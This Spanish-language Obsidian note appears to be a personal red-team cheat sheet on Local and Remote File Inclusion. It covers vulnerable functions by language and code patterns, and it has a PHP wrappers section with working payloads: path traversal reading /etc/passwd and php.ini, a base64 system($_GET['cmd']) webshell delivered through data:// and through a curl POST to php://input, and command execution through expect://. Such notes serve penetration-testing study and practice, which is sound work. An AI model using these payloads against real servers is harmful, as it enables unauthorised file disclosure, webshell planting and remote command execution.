---
aliases:
tags:
  - type/vulnerability
  - vuln/lfi
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[LFI - Básico]]"
  - "[[LFI - Path Traversal y Bypass de Filtros]]"
  - "[[LFI - Null Byte Injection ]]"
  - "[[LFI - PHP Wrappers]]"
  - "[[RFI - Remote File Inclusion]]"
  - "[[LFI To RCE - Log Poisoning ]]"
  - "[[LFI To RCE - proc self environ]]"
  - "[[LFI To RCE - Session File Poisoning ]]"
  - "[[LFI To RCE - File Upload + LFI]]"
  - "[[LFI To RCE - PHP Filter Chains ]]"
  - "[[LFI To RCE - Phar Deserialization]]"
---
# File Inclusion 

***

## Cheatsheet

### Vectores de Entrada (Básicos)

````tabs
tab: **Básico** 
![[LFI - Básico#^lfi-basico]]

tab: **Remoto**
![[RFI - Remote File Inclusion#^lfi-remote]]
````

### Técnicas de Evasión (Bypassing)

````tabs
tab: **Path Traversal** 
![[LFI - Path Traversal y Bypass de Filtros#^lfi-traversal]]

tab: **Null Byte**
![[LFI - Null Byte Injection#^lfi-nullbyte]]
````

### Abuso de Protocolos/Streams (Wrappers)

````tabs
tab: **Wrappers** 
![[LFI - PHP Wrappers#^lfi-wrappers]]

tab: **Filter Chain**
![[LFI To RCE - PHP Filter Chains#^lfi-phpfilter]]
````

### Envenenamiento de Archivos (Poisoning para RCE)

````tabs
tab: **Log Poisoning** 
![[LFI To RCE - Log Poisoning#^lfi-logpoisoning]]

tab: **Session File Poisoning**
![[LFI To RCE - Session File Poisoning#^lfi-sessionpoisoning]]

tab: **/proc/self/environ**
![[LFI To RCE - proc self environ#^lfi-environ]]
````

### Vectores Combinados y Lógica

````tabs
tab: **File Upload + LFI** 
![[LFI To RCE - File Upload + LFI#^lfi-fileupload]]

tab: **Phar Deserialization**
![[LFI To RCE - Phar Deserialization#^lfi-deserialization]]
````


***

## Overview


***

## Notas Relacionadas


***





---



---

## Funciones vulnerables por lenguaje

| Lenguaje | Función                         | Lee | Ejecuta | URL Remota |
| -------- | ------------------------------- | --- | ------- | ---------- |
| PHP      | `include()` / `include_once()`  | ✅   | ✅       | ✅          |
| PHP      | `require()` / `require_once()`  | ✅   | ✅       | ❌          |
| PHP      | `file_get_contents()`           | ✅   | ❌       | ✅          |
| PHP      | `fopen()` / `file()`            | ✅   | ❌       | ❌          |
| NodeJS   | `fs.readFile()`                 | ✅   | ❌       | ❌          |
| NodeJS   | `fs.sendFile()`                 | ✅   | ❌       | ❌          |
| NodeJS   | `res.render()`                  | ✅   | ✅       | ❌          |
| Java     | `include`                       | ✅   | ❌       | ❌          |
| Java     | `import`                        | ✅   | ✅       | ✅          |
| .NET     | `@Html.Partial()`               | ✅   | ❌       | ❌          |
| .NET     | `@Html.RemotePartial()`         | ✅   | ❌       | ✅          |
| .NET     | `Response.WriteFile()`          | ✅   | ❌       | ❌          |
| .NET     | `<!--#include file-->`        | ✅   | ✅       | ✅          |

---

## Conceptos clave

> [!info] LFI — Local File Inclusion
> Manipular parámetros para leer archivos locales del servidor.
> Ejemplo: `?page=../../etc/passwd`

> [!warning] RFI — Remote File Inclusion
> Cargar archivos desde URLs externas. Solo posible con funciones que soporten URL remota.

> [!tip] Impacto: solo lectura
> Filtración de código fuente, credenciales, claves de DB, archivos de configuración.

> [!danger] Impacto: ejecución
> RCE completo → compromiso total del servidor backend y servidores conectados.

---

## Patrón típico de entrada vulnerable

```php
// PHP
include($_GET['language']);
```

```javascript
// NodeJS
fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
    res.write(data);
});
```

```jsp
<!-- Java -->
<jsp:include file="<%= request.getParameter('language') %>" />
```

```csharp
// .NET
Response.WriteFile(HttpContext.Request.Query['language']);
```

---

## Dónde buscar LFI

- Parámetros de URL: `?page=`, `?language=`, `?file=`, `?view=`, `?template=`
- Templating engines que cargan contenido dinámico
- Funciones que toman paths desde input del usuario sin sanitizar

---

## Read vs Execute — Resumen rápido

> [!abstract] Regla general
> - **Solo lee** → podés extraer source code, credenciales, configs
> - **Ejecuta** → podés lograr RCE si controlás el contenido del archivo incluido
> - **URL remota** → abre la puerta a RFI (incluir tu propio archivo malicioso desde tu server)


---

# Wrappers

| **Wrapper**    | **Requisito**                                               | **Sintaxis / Payload**                                       | **Método HTTP**         | **Ejemplo**                                                                                          |
| -------------- | ----------------------------------------------------------- | ------------------------------------------------------------ | ----------------------- | ---------------------------------------------------------------------------------------------------- |
| `php://filter` | Ninguno (lectura)                                           | `php://filter/read=convert.base64-encode/resource=<archivo>` | GET                     | `?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini` |
| `data://`      | `allow_url_include=On`                                      | `data://text/plain;base64,<PHP_b64>` + `&cmd=<cmd>`          | GET                     | `?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`       |
| `php://input`  | `allow_url_include=On`, parámetro acepta POST               | `php://input` con webshell en el body                        | POST (body) + GET (cmd) | `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "...?language=php://input&cmd=id"`             |
| `expect://`    | Extensión `expect` instalada y cargada (`extension=expect`) | `expect://<comando>`                                         | GET                     | `?language=expect://id`                                                                              |

**Verificaciones previas (vía LFI con `php://filter`)**

| Qué chequear | Comando |
|---|---|
| Leer `php.ini` (Apache) | `/etc/php/X.Y/apache2/php.ini` |
| Leer `php.ini` (Nginx/FPM) | `/etc/php/X.Y/fpm/php.ini` |
| Confirmar `allow_url_include` | `… \| base64 -d \| grep allow_url_include` |
| Confirmar `expect` | `… \| base64 -d \| grep expect` |

**Webshell base para `data://` / `input`**

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Notas clave**
- `allow_url_include` está **off por defecto** — sin él, `data://` y `php://input` no funcionan (y tampoco RFI).
- `php://input` requiere que el parámetro vulnerable acepte POST; si solo acepta GET, no sirve.
- Si la función usa solo `$_POST` (no `$_REQUEST`), meté el comando hardcodeado en el PHP: `<?php system('id'); ?>` en vez de webshell dinámica.
- `expect://` está cargado en config ≠ funcional en runtime — siempre testealo con un `id`.
- URL-encodear el payload base64: = → `%3D`, `+` → `%2B`.

___

`python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'`
